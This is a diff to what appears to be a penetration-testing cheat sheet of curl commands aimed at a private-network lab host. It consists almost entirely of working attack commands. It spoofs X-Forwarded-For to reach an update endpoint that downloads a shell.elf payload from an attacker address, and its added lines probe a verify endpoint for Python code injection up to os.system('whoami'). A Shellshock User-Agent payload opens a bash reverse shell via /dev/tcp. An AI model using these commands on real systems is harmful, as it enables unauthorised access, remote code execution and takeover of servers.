@@ -24,5 +24,11 @@ curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST
 curl http://192.168.200.5/update --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"user":"bobadmin", "url":"http://192.168.119.154:22/shell.elf"}
 curl http://192.168.200.5/restart --header "X-Forwarded-For: 127.0.0.1" -X POST -H 'Content-Type: application/json' -d '{"confirm":"true"}
 
+API Execution
+curl http://192.168.200.5/verify
+curl http://192.168.200.5/verify -d "code=2*9"
+curl http://192.168.200.5/verify -d "code=os"
+curl http://192.168.200.5/verify -d "code=os.system('whoami')
+
 Shellshock
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.154/PORT 0>&1' http://192.168.200.5/bad.txt
